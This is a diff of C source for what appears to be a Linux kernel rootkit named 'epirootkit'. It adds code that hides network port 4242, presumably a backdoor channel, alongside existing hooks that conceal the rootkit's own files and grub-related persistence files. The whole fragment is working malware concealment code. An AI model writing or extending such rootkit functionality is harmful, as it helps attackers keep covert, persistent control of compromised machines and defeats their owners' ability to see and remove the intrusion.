@@ -33,6 +33,12 @@ int init_interceptor(void) {
         ERR_MSG("init: hide_init() failed: %d\n", err);
         return err;
     }
+
+    err = hide_port_init();
+     if (err) {
+        ERR_MSG("init: hide_port_init() failed: %d\n", err);
+        return err;
+    }
     
     err = fh_install_hooks(hooks, hook_array_size);
     if (err) {
@@ -59,6 +65,9 @@ int init_interceptor(void) {
     forbid_file("/.grub.sh");
     forbid_file("/etc/default/grub.d/99.cfg");
     forbid_file("/usr/lib/epirootkit");
+
+    // Hide ports
+    hide_port("4242");
 
     // Hide module in /proc/modules
     // hide_module();
